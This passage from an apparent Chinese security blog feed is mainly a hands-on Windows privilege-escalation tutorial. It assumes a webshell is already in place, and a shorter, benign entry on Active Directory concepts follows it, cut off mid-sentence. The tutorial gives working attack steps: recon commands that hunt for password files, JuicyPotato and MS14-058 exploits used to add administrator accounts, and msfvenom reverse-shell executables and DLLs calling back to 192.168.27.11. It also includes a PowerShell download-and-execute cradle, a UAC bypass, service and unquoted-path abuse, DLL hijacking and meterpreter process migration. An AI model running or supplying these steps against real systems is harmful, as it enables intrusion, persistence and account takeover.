            "content_html": "<h3 id=\"提权基础\"><a class=\"markdownIt-Anchor\" href=\"#提权基础\">#</a> <span class=\"label\">提权基础</span></h3>\n<p>获取 webshell 后一般都是 www-data 权限权限很低所以要进行提权把权限提高为了后续渗透顺利</p>\n<p>windows 的常用提权方法，主要分为漏洞提权、windwos 特性提权、第三方组件提权，数据库提权 ftp 提权 令牌窃取提权等姿势。</p>\n<p>使用 Windows 命令提示符执行的，它将系统信息输出到名为 &quot;a.txt&quot; 的文件中，然后检查特定的 Windows 更新是否已安装。如果某些指定的更新未安装，它会输出一条消息表示这些更新未安装。最后，它会删除临时文件 &quot;a.txt</p>\n<p>systeminfo&gt;a.txt&amp;(for %i in (KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 kb942831 KB2503665 KB2592799) do @type a.txt|@find /i “%i”||@echo %i Not Installed!)&amp;del /f /q /a a.txt</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110225111274.png\" alt=\"image-20231110225111274\"></p>\n<p>提权辅助:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4v\">https://i.hacking8.com/tiquan/</span></p>\n<p>windows 漏洞集合<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY1dpa2kvd2luZG93cy1rZXJuZWwtZXhwbG9pdHM=\"> https://github.com/SecWiki/windows-kernel-exploits</span></p>\n<h3 id=\"收集信息常用命令\"><a class=\"markdownIt-Anchor\" href=\"#收集信息常用命令\">#</a> <span class=\"label\">收集信息常用命令</span></h3>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ipconfig /all                                            --网卡配置</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>systeminfo                                               --系统补丁信息等</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>echo %PROCESSOR_ARCHITECTURE%                            --系统体系结构</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>wmic product get name,version                            --安装软件、版本、路径</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>wmic service list brief                                  --查询本机服务信息</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>tasklist -svc                                            --进程查看</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>schtasks /query /fo list /v                              --任务计划查询</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>net statistics workstation                               --开机时间</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>net user                                                 --查看用户</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>whoami /all                                              --SID等用户信息</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>net localgroup administrators                            --查看管理员组中的用户</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>net session                                              --会话查看</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>netstat -ano                                             --网络连接以及通过端口判断服务</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>net share                                                --共享</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>route print                                              --路由信息</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>arp -a                                                   --arp信息</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>cmdkey /l                                                --登录历史</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>hosts文件  Linux：/etc/hosts  Windows：c:\\Windows\\system32\\drivers\\etc\\hosts</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>ipconfig  /displaydns                                    --dns缓存</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>net view                                                 --查看共享</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>dir /s /b \"pass\" \"user\" \"config\" \"username.\" \"password.\" --命令行查找敏感文件</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>findstr  /s /m \"password\" *.*                            --寻找包含密码字段的文件，如数据库密码文件</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>net user /domain                                         --查看域用户</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>net time /domain                                         --查看时间服务器（可能为DC）</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>net group \"domain admins\" /domain                        --查看域管理员</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>net group \"domaincontrollers\" /domain                    --查看域控制器</pre></td></tr></table></figure><p>net user 显示当前系统中的所有用户信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110133913521.png\" alt=\"image-20231110133913521\"></p>\n<p>net user 31166 查看用户详细信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134358877.png\" alt=\"image-20231110134358877\"></p>\n<h4 id=\"whoami-all\"><a class=\"markdownIt-Anchor\" href=\"#whoami-all\">#</a> <span class=\"label\">whoami /all</span></h4>\n<p>获取当前用户详细信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134649977.png\" alt=\"image-20231110134649977\"></p>\n<h4 id=\"hostname\"><a class=\"markdownIt-Anchor\" href=\"#hostname\">#</a> <span class=\"label\">hostname</span></h4>\n<p>获取主机名</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134745836.png\" alt=\"image-20231110134745836\"></p>\n<h4 id=\"whoami-priv\"><a class=\"markdownIt-Anchor\" href=\"#whoami-priv\">#</a> <span class=\"label\">whoami /priv</span></h4>\n<p>获取当前用户的安全特权</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134929728.png\" alt=\"image-20231110134929728\"></p>\n<h4 id=\"net-start\"><a class=\"markdownIt-Anchor\" href=\"#net-start\">#</a> <span class=\"label\">net start</span></h4>\n<p>获取已经启动的 Windows 服务</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110135119067.png\" alt=\"image-20231110135119067\"></p>\n<h4 id=\"systeminfo\"><a class=\"markdownIt-Anchor\" href=\"#systeminfo\">#</a> <span class=\"label\">systeminfo</span></h4>\n<p>获取电脑打了那些补丁为之后提权打下基础</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110151656666.png\" alt=\"image-20231110151656666\"></p>\n<h4 id=\"扫描可写可读目录\"><a class=\"markdownIt-Anchor\" href=\"#扫描可写可读目录\">#</a> <span class=\"label\">扫描可写可读目录</span></h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110151233596.png\" alt=\"image-20231110151233596\"></p>\n<h3 id=\"windows常用提权\"><a class=\"markdownIt-Anchor\" href=\"#windows常用提权\">#</a> <span class=\"label\">windows 常用提权</span></h3>\n<h4 id=\"ms16-075烂土豆提权\"><a class=\"markdownIt-Anchor\" href=\"#ms16-075烂土豆提权\">#</a> <span class=\"label\">MS16-075 烂土豆提权</span></h4>\n<p>影响版本：Windows 7、Windows 8.1、Windows 10、Windows Server 2008、Windows Server 2012 等</p>\n<p>下载网址</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL1N3ZWV0UG90YXRv\">https://github.com/uknowsec/SweetPotato</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL0p1aWN5UG90YXRvL2Jsb2IvbWFpbi9KdWljeVBvdGF0by1zaGVsbGNvZGUvQmluL0p1aWN5UG90YXRvLmV4ZQ==\">https://github.com/uknowsec/JuicyPotato/blob/main/JuicyPotato-shellcode/Bin/JuicyPotato.exe</span></p>\n<p>找到了可读写目录上传 exe</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110153059031.png\" alt=\"image-20231110153059031\"></p>\n<p>执行命令</p>\n<p>C:\\inetpub\\wwwroot\\dedecms\\JuicyPotato_x64.exe net user yunyi2 1234567890 /add &amp;&amp; net localgroup administrators yunyi/add</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110160256590.png\" alt=\"image-20231110160256590\"></p>\n<h4 id=\"ms14-058提权\"><a class=\"markdownIt-Anchor\" href=\"#ms14-058提权\">#</a> <span class=\"label\">MS14-058 提权</span></h4>\n<p>具体而言，win32k.sys 是 Windows 子系统的一部分，负责窗口管理和屏幕输出。如果内核模块未正确处理内存中的对象，攻击者可能会通过利用这一漏洞来在内核模式中执行任意代码。成功利用此漏洞的攻击者可以在系统中运行具有更高权限的代码，进而执行一系列危险操作，如安装程序、查看、更改或删除数据，或者创建具有完全管理权限的新账户。</p>\n<p>影响版本<br>\n Windows x64，包括 Windows 7 和 Windows Server 2008 R2 及以下</p>\n<p>上传 exe 到可执行目录</p>\n<p>whoami 看到已经是 nt authority\\system</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182725492.png\" alt=\"image-20231110182725492\"></p>\n<p>64.exe “net user yunyi 123456 /add” 添加用户</p>\n<p>64.exe &quot;net localgroup administrators yunyi /add&quot; 添加到管理员组</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182123803.png\" alt=\"image-20231110182123803\"></p>\n<p>远程端口连接成功</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182617605.png\" alt=\"image-20231110182617605\"></p>\n<h4 id=\"cve-2020-0787\"><a class=\"markdownIt-Anchor\" href=\"#cve-2020-0787\">#</a> <span class=\"label\">CVE-2020-0787</span></h4>\n<p>影响版本</p>\n<p>Windows 10 Version 1809 for ARM64-based Systems<br>\nWindows Server 2008 for 32-bit Systems Service Pack 2<br>\nWindows RT 8.1<br>\nWindows 8.1 for x64-based systems<br>\nWindows 8.1 for 32-bit systems<br>\nWindows 7 for x64-based Systems Service Pack 1<br>\nWindows 7 for 32-bit Systems Service Pack 1<br>\nWindows Server 2016 (Server Core installation)<br>\nWindows Server 2016<br>\nWindows 10 Version 1607 for x64-based Systems<br>\nWindows 10 Version 1607 for 32-bit Systems<br>\nWindows 10 for x64-based Systems<br>\nWindows 10 for 32-bit Systems<br>\nWindows Server, version 1903 (Server Core installation)<br>\nWindows 10 Version 1903 for ARM64-based Systems<br>\nWindows 10 Version 1903 for x64-based Systems<br>\nWindows 10 Version 1903 for 32-bit Systems<br>\nWindows 10 Version 1709 for ARM64-based Systems<br>\nWindows 10 Version 1709 for x64-based Systems<br>\nWindows 10 Version 1709 for 32-bit Systems<br>\nWindows Server, version 1909 (Server Core installation)<br>\nWindows 10 Version 1909 for ARM64-based Systems<br>\nWindows 10 Version 1909 for x64-based Systems<br>\nWindows 10 Version 1909 for 32-bit Systems<br>\nWindows Server 2019 (Server Core installation)<br>\nWindows Server 2019<br>\nWindows Server 2012 R2 (Server Core installation)<br>\nWindows Server 2012 R2<br>\nWindows Server 2012 (Server Core installation)<br>\nWindows Server 2012<br>\nWindows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>\nWindows Server 2008 R2 for x64-based Systems Service Pack 1<br>\nWindows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)<br>\nWindows Server 2008 for x64-based Systems Service Pack 2<br>\nWindows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)<br>\nWindows 10 Version 1809 for x64-based Systems<br>\nWindows 10 Version 1809 for 32-bit Systems<br>\nWindows 10 Version 1803 for ARM64-based Systems<br>\nWindows Server, version 1803 (Server Core Installation)<br>\nWindows 10 Version 1803 for x64-based Systems<br>\nWindows 10 Version 1803 for 32-bit Systems</p>\n<p>脚本地址</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Nid2FuZzUwNS9DVkUtMjAyMC0wNzg3LUVYUC1BTEwtV0lORE9XUy1WRVJTSU9OL3JlbGVhc2VzL3RhZy8x\">https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/tag/1</span></p>\n<p>要求上桌面执行，会弹出系统权限的 cmd</p>\n<p>把 exe 上传后切换上面创建的用户登陆桌面</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185051791.png\" alt=\"image-20231110185051791\"></p>\n<p>执行后弹出 cmd</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185214126.png\" alt=\"image-20231110185214126\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185227277.png\" alt=\"image-20231110185227277\"></p>\n<h3 id=\"msf利用\"><a class=\"markdownIt-Anchor\" href=\"#msf利用\">#</a> <span class=\"label\">msf 利用</span></h3>\n<p>先生成一个木马文件</p>\n<p>msfvenom  -p windows/meterpreter/reverse_tcp lhost=192.168.27.11 lport=8989-f exe &gt;/vs.exe</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110211226995.png\" alt=\"image-20231110211226995\"></p>\n<p>msf 打开监听</p>\n<p>use exploit/multi/handler</p>\n<p>set payload windows/meterpreter/reverse_tcp</p>\n<p>set lhost 192.168.27.11</p>\n<p>set lport 8989</p>\n<p>exploit</p>\n<p>用 webshell 上传到受害机执行木马文件</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110213027928.png\" alt=\"image-20231110213027928\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110213439218.png\" alt=\"image-20231110213439218\"></p>\n<p>跟之前一样查看打了那些补丁</p>\n<p>输入 shell 获取 cmd 使用 systeminfo 获取到信息后跟之前一样去找可以用的提权</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214317729.png\" alt=\"image-20231110214317729\"></p>\n<p>用 background 命令把会话放在后台，可以用 session 查看已建立的会话信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214725591.png\" alt=\"image-20231110214725591\"></p>\n<p>search ms14_058 查找漏洞信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214943295.png\" alt=\"image-20231110214943295\"></p>\n<p>use exploit/windows/local/ms14_058_track_popup_menu</p>\n<p>show options 查看利用要求</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110215511454.png\" alt=\"image-20231110215511454\"></p>\n<p>设置会话 id 刚才看的是 session 2 所以设置为 2</p>\n<p>set session 2</p>\n<p>然后 exploit 执行</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110220237813.png\" alt=\"image-20231110220237813\"></p>\n<p>use exploit/windows/local/ms16_075_reflection_juicy</p>\n<p>ms14_058 没有成功所以换了 ms16 _075 成功获取 system 权限</p>\n<p>切换 shell 添加用户并加入管理员</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110221425934.png\" alt=\"image-20231110221425934\"></p>\n<p>维权</p>\n<p>ps 列出进程</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110221951490.png\" alt=\"image-20231110221951490\"></p>\n<p>migrate 1184</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110222507771.png\" alt=\"image-20231110222507771\"></p>\n<h3 id=\"uac提权\"><a class=\"markdownIt-Anchor\" href=\"#uac提权\">#</a> <span class=\"label\">UAC 提权</span></h3>\n<p>用户账户控制（UAC）是 Windows 操作系统中的一项安全特性。它旨在帮助防止未经授权的对计算机的更改。当一个程序尝试执行需要管理员权限的更改时，UAC 会通知用户并在允许更改之前征得用户的确认。</p>\n<p>UAC 通过确保只有在用户明确同意的情况下才执行管理操作，有助于降低未经授权的更改和恶意软件安装的风险。这样，即使用户以管理员身份登录，他们仍然需要确认他们意图执行可能对系统造成影响的某些操作。</p>\n<p>前提：已获取目标本地用户权限</p>\n<p>上传 msf 木马执行</p>\n<p>现在为普通用户权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111102136583.png\" alt=\"image-20231111102136583\"></p>\n<p>search 搜索一下 UAC 利用模块</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111100615934.png\" alt=\"image-20231111100615934\"></p>\n<p>使用 exploit/windows/local/bypassuac 模块</p>\n<p>set session 5</p>\n<p>run</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111102853388.png\" alt=\"image-20231111102853388\"></p>\n<p>执行成功过后再使用 getsystem</p>\n<p>getuid 查看已经是 system 权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111102946311.png\" alt=\"image-20231111102946311\"></p>\n<h3 id=\"windows系统配置错误提权\"><a class=\"markdownIt-Anchor\" href=\"#windows系统配置错误提权\">#</a> <span class=\"label\">windows 系统配置错误提权</span></h3>\n<h4 id=\"系统服务权限配置错误\"><a class=\"markdownIt-Anchor\" href=\"#系统服务权限配置错误\">#</a> <span class=\"label\">系统服务权限配置错误</span></h4>\n<p>Windows 在系统启动时，会伴随着一些高权服务启动 (windows 服务是以 system 权限运行的) 如果某些服务存在一些漏洞，那么就能够借此服务进行权限劫持，例如 DLL 劫持</p>\n<p>如果一个低权限用户对系统服务调用的可执行文件有写权限，他们可以替换该文件，并在系统启动时获取控制权限。尽管 Windows 服务以 system 权限运行，其文件夹、文件和注册表项受到强制访问控制的保护，但在某些情况下，仍可能存在一些缺乏有效保护的服务。</p>\n<p><span class=\"label\">Metasploit</span></p>\n<p>上线木马当前是 iis 权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111112119228.png\" alt=\"image-20231111112119228\"></p>\n<p>background 把会话放在后台</p>\n<p>切换到 use exploit/windows/local/service_permissions 攻击模块</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111112359457.png\" alt=\"image-20231111112359457\"></p>\n<p>set session 4</p>\n<p>设置为 session 4</p>\n<p>exploit 执行</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111112807154.png\" alt=\"image-20231111112807154\"></p>\n<p><span class=\"label\">PrivescCheck</span></p>\n<p>脚本地址<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2l0bTRuL1ByaXZlc2NDaGVjaw==\"> https://github.com/itm4n/PrivescCheck</span></p>\n<p>列举共同 Windows 配置问题  ，可以利用当地的权限升级</p>\n<p>使用 1:   基本的使用情况</p>\n<pre><code>powershell -ep bypass -c &quot;. .\\PrivescCheck.ps1; Invoke-PrivescCheck&quot;\n</code></pre>\n<p>远程使用</p>\n<pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object \nNet.WebClient).DownloadString('http://192.168.27.11/PrivescCheck.ps1'); Invoke-PrivescCheck&quot;\n</code></pre>\n<p><span class=\"label\">PowerUp</span></p>\n<p>导入并执行脚本 powershell.exe -exec bypass -command “&amp;{Import-Module .\\PowerUp.ps1;Invoke-AllChecks}”</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111173012800.png\" alt=\"image-20231111173012800\"></p>\n<p>StartName    : LocalSystem</p>\n<p>AbuseFunction  : Install-ServiceBinary -ServiceName ‘MongoDB’</p>\n<p>利用 Install-ServiceBinary 模块，通过 PowerUp 利用该处权限配置不当可直接添加管理员用户</p>\n<p>添加管理员</p>\n<p>powershell.exe -exec bypass -command “&amp;{Import-Module .\\PowerUp.ps1;Install-ServiceBinary -ServiceName ‘MongoDB’ -UserName yunyi4 -Password admin}”</p>\n<p>服务被重启或者计算机重启后就可以添加成功了</p>\n<h4 id=\"不带引号的服务路径\"><a class=\"markdownIt-Anchor\" href=\"#不带引号的服务路径\">#</a> <span class=\"label\">不带引号的服务路径</span></h4>\n<p>当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>\n<p>使用命令查看服务器存在空格，路径可写 即存在漏洞</p>\n<p>wmic service get name,displayname,pathname,startmode |findstr /i “Auto” |findstr /i /v “C:\\Windows\\” |findstr /i /v “”&quot;</p>\n<p>例如</p>\n<p>C:\\Program Files<br>\n(x86)\\2345Soft\\2345Pic\\protect\\Pic_2345Svc.exe    Auto</p>\n<p>这种存在空格</p>\n<p>msf 生成一个 program.exe 放在 c 应用重启即可上线</p>\n<h3 id=\"dll劫持提权\"><a class=\"markdownIt-Anchor\" href=\"#dll劫持提权\">#</a> <span class=\"label\">DLL 劫持提权</span></h3>\n<p>查看应用进程找数字签名或者未知文件</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111191157012.png\" alt=\"image-20231111191157012\"></p>\n<p>生成一个名字一样的 dll 并且替换</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.27.11 lport=6789 -f dll &gt; /root/2345MgrDLL.dll</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111191517160.png\" alt=\"image-20231111191517160\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111191909318.png\" alt=\"image-20231111191909318\"></p>\n<p>msf 上线</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111192614857.png\" alt=\"image-20231111192614857\"></p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/",
            "url": "http://gyzero.shop/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/",
            "title": "域环境",
            "date_published": "2023-10-30T04:00:34.000Z",
            "content_html": "<h3 id=\"域\"><a class=\"markdownIt-Anchor\" href=\"#域\">#</a> 域</h3>\n<p>在计算机网络中，<strong>域环境</strong>是一种组织资源和用户的方式，它允许集中管理和控制网络中的各种对象。</p>\n<ol>\n<li><strong>域（Domain）</strong>：\n<ul>\n<li>域是一个逻辑上分组的计算机、用户和设备集合，它们共享一个安全边界和一组共同的策略。</li>\n<li>域的边界通常由网络协议、安全策略和域控制器来定义。</li>\n<li>域提供了集中式的管理和认证，使得网络资源的访问和管理更加方便和安全。</li>\n</ul>\n</li>\n<li><strong>域控制器（Domain Controller）</strong>：\n<ul>\n<li>域控制器是域环境中的核心组件，负责管理域中的安全认证和授权、用户账户和计算机账户的管理。</li>\n<li>它运行特定的服务，如活动目录服务（Active Directory Service）。</li>\n<li>域控制器保存了域中的用户、组、计算机等对象的信息，并提供身份验证和授权服务。</li>\n</ul>\n</li>\n<li><strong>活动目录（Active Directory）</strong>：\n<ul>\n<li>活动目录是一种目录服务，用于在网络环境中存储、组织和提供对网络资源的访问。</li>\n<li>它包含了域内所有对象的信息，如用户、组、计算机等，并提供了一种层次结构来组织这些对象。</li>\n<li>活动目录允许管理员通过分配权限和策略来控制用户对资源的访问和使用。</li>\n<li><strong>集中式身份验证和授权</strong>：\n<ul>\n<li>活动目录允许用户通过单一的登录认证来访问网络上的各种资源，无论是文件共享、打印机、电子邮件等。</li>\n<li>用户登录后，活动目录负责验证其身份，并根据其权限授予对资源的访问权限。</li>\n</ul>\n</li>\n<li><strong>集中式资源管理</strong>：\n<ul>\n<li>活动目录可以存储和管理网络中的各种资源，包括用户账户、计算机账户、组、文件共享、打印机等。</li>\n<li>管理员可以使用活动目录管理工具对这些资源进行组织、分配权限、设置策略等操作。</li>\n</ul>\n</li>\n<li><strong>层次结构组织</strong>：\n<ul>\n<li>活动目录使用层次结构来组织网络资源和用户信息，这种层次结构称为目录树或者域树。</li>\n<li>目录树由各种对象组成，包括域、组织单位（OU）、容器、用户、计算机等，这些对象可以按照管理员的需求进行组织和管理。</li>\n</ul>\n</li>\n<li><strong>灵活的安全模型</strong>：\n<ul>\n<li>活动目录提供了灵活的安全模型，可以根据组织的需求来设置不同级别的安全策略和权限控制。</li>\n<li>管理员可以通过活动目录设置用户访问权限、密码策略、帐户锁定策略、加密选项等，以确保网络安全。</li>\n</ul>\n</li>\n<li><strong>集中式管理工具</strong>：\n<ul>\n<li>微软提供了各种管理工具，如 “活动目录用户和计算机”、“组策略管理编辑器” 等，用于管理和配置活动目录环境。</li>\n<li>这些工具提供了用户界面和命令行界面，可以用于执行各种管理任务，如创建用户、组织单位、设置组策略等。</li>\n</ul>\n</li>\n<li><strong>复制和同步</strong>：\n<ul>\n<li>活动目录支持在多个域控制器之间进行复制和同步，以确保数据的一致性和可用性。</li>\n<li>当有新的数据或者更改发生时，活动目录会自动将这些变更复制到其他域控制器，以保持整个活动目录环境的同步。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>域成员（Domain Member）</strong>：\n<ul>\n<li>域成员是加入域的计算机或设备，它们受到域控制器的管理。</li>\n<li>加入域后，域成员可以通过活动目录中的账户进行身份验证，并且可以访问域中共享的资源。</li>\n</ul>\n</li>\n<li><strong>组策略（Group Policy）</strong>：\n<ul>\n<li>组策略是一种管理工具，用于在域环境中配置和管理用户和计算机的操作系统和应用程序设置。</li>\n<li>管理员可以通过组策略向域中的用户和计算机分配特定的设置和权限，以实现统一的管理和安全策略。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"常见的域环境\"><a class=\"markdownIt-Anchor\" href=\"#常见的域环境\">#</a> 常见的域环境</h3>\n<ol>\n<li><strong>单域</strong>：在一个地理位置固定的小公司中，建立一个域通常就可以满足需求。在一个域内，至少需要两台域服务器，一台作为<strong>域控制器</strong>（Domain Controller，DC），另一台作为备份 DC。</li>\n<li><strong>父域和子域</strong>：出于管理和其他需求，需要在网络中划分多个域。第一个域称为<strong>父域</strong>，各分部的域称为该域的<strong>子域</strong>。</li>\n<li><strong>域树</strong>：域树是多个域通过建立信任关系组成的集合。在域树内，父域和子域可以相互管理，并跨网络分配文件、打印机等设备和资源。</li>\n<li><strong>域森林</strong>：域森林是指多个域树通过建立信任关系的集合。域森林允许不同域之间实现资源共享、管理、通信和数据传输。</li>\n<li><strong>活动目录</strong>（Active Directory，AD）：活动目录是域环境中提供目录服务的组件。它是微软提供的统一管理基础的平台，用于集中管理账号、软件、环境和增强安全性。</li>\n</ol>\n<h3 id=\"域内权限\"><a class=\"markdownIt-Anchor\" href=\"#域内权限\">#</a> 域内权限</h3>\n<ol>\n<li>\n<p><strong>安全组（Security Group）</strong>：</p>\n<ul>\n<li>安全组用于管理对资源的访问权限。</li>\n<li>可以将用户或计算机添加到安全组中，从而授予他们访问某些资源的权限。</li>\n<li>安全组的权限可以直接应用于文件夹、共享文件夹、打印机等资源，或者通过组策略应用于计算机。</li>\n</ul>\n</li>\n<li>\n<p><strong>分发组（Distribution Group）</strong>：</p>\n<ul>\n<li>分发组用于向一组用户或计算机发送邮件。</li>\n<li>分发组通常用于群发邮件、通知、公告等目的，而不涉及访问资源的权限管理。</li>\n<li>分发组的成员可以收到组发的邮件，但不会获得访问资源的权限。</li>\n</ul>\n</li>\n<li>\n<p><strong>域本地组（Domain Local Group）</strong>：</p>\n<ul>\n<li>域本地组是一种在单个域内使用的组，用于管理对资源的访问权限。</li>\n<li>可以将用户、全局组或其他域本地组添加到域本地组中，并为该组分配访问资源的权限。</li>\n<li>域本地组的权限范围局限于单个域内，不会跨域生效。</li>\n</ul>\n</li>\n<li>\n<p><strong>全局组（Global 